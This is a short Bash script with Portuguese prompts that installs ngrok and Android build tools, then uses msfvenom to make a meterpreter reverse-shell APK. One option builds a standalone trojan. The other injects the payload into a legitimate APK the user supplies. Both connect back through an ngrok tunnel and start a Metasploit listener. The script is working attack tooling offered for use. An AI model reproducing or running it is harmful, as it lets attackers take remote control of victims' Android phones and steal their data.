#!/bin/bash
clear
echo "dependencias necessarias
default-jdk zipalign apktool "
echo "Instala dependencias [s/n]?"
read resp
if [ "$resp" = "s" ]
then
echo "Instalando dependicias..\n"
apt install -y default-jdk zipalign apktool unzip
echo -n "Concluindo! Da enter pra continuar!"
read ent
fi
menu()
{
clear
echo "1-Instala Ngrok"
echo "2-Cria trojan"
echo "3-Cria trojan 'apk-original' \n"
echo -n "Escolha uma opcao?\n"
read resp1

if [ "$resp1" = "1" ]
then
cd /root
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip
unzip -o ngrok.zip && cp ngrok /bin && chmod +x /bin/ngrok && rm -rf /root/ngrok*
echo -n "Autentica conta do ngrok : \n"
read x
ngrok authtoken $x
echo " "
echo "Pronto Ngrok instalado e configurado"
menu
fi
if [ "$resp1" = "2" ]
then
echo "LPORT = "
read port
msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port -o trojan.apk
msfconsole -r trojan.rb
fi
if [ "$resp1" = "3" ]
then
echo -n "APK = "
read apk
echo -n "LPORT = "
read port1
msfvenom -x $apk --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port1 -o trojan.apk
msfconsole -r trojan.rb
fi
}
menu

